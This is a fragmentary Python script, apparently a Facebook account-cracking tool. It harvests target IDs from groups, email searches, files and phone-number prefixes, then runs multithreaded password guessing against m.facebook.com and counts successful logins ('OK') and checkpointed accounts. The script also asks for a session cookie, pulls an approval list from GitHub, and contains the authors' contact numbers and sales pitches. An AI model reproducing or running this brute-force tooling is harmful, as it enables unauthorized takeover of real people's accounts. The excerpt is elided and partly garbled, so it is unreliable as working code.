...
author = 'ARVEL ANSYAH'
WHATSAPP = '+8801886476943'
faceb0ok = 'ANSYAH ARVEL'
notice = 'if you want to buy a good prem sc wa aja'
...

  
   CREATED BY   :  JIBON AHMED           
   FACEBOK      : MD JIBON AHMED JITU              
   GITHUB       :  JIB0N        
   TOOL STATUS  :  TOOL IS SEX           
   TEAM         :  PRIVATE                 
   TOOL VIRSION :  1.3                     
...
╚══╩══╝─╚╝─╚═══╝
   ...
   {M}â€¢{K}â€¢{H}â€¢ {P}ALREADY GREAT WANT A GOOD COCK BY ARVEL
   WA +8801886476943
   sc prem wa aja {H}â€¢{K}â€¢{M}â€¢""")   
def logo2():
	return str(f"""
{M}
...
def main_apv():
    ...
    try:
        ...
        print ("         à¼„MRá­„â€¢â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â€¢à¼„SAIMONá­„")
        ...
        os.system('am start https://wa.me/+8801867341765?text=' + tks)

        

    r1=requests.get("https://raw.githubusercontent.com/JIB0N/Approval/main/F.txt").text
...
try:
	clear_layar()
	print(logo2())
	print(f'\r\n [{hh}>{P}] currently dump proxy and create useragent')
...
def login():
	clear_layar()
	print(logo2())
	cookie = input(f"\n [{hh}<{P}] do not use personal accounts\n cookie : ")
...
def cek_opsi_cp():
	...
	except:sys.exit(f" [{M}>{P}] no cp result")
	for x in ok:
		nom.append(x)
		no+=1
...
###---[ DUMP NO LOGIN ]---###
def crack_nomor():
	print(f' [{hh}<{P}] crack number use manual password')
	depan = input(' awalan : ')
	if len(depan)==3:pass
...
def clon_email():
	...
	global ok , cp
	print(f' [{hh}>{P}] dumps of e-mails, max 1000 id')
	nama = input(' target : ')
	if ',' in str(nama):
...
def crack_file():
	...
	try:
		...
		for data in uuid:
			try:user,nama = data.split('|')
			except:exit(f" [{M}>{P}] fault separator")
			dump.append(data)
			print('\r being dumped %s id'%(len(dump)),end=" ")
			sleep(0.0000003)
	except FileNotFoundError:exit(f" [{M}>{P}] file doesn't exist")
...
def cari_nama(link):
	...
	try:
		link = r.find('a',string='l m').get('href')
		if(link):
			print('\r being dumped %s id'%(len(dump)),end=" ")
			sys.stdout.flush()
			cari_nama(link)
...
def crack_group():
	...
	if len(dump)==0:
		exit(f' [{M}>{P}] Failed to dump groups')
	atur_atur()
	...
	with tred(max_workers=30) as babas:
		for akun in id:
			...
			if 'mobile' in metode:
				...
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r [{hh}<{P}] crack has been completed number OK:{ok} number of CPs:{cp} ')
...
def otomatis():
	...
	print(f"{P} â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
	awal = datetime.now()
	with tred(max_workers=60) as babas:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pwx = []
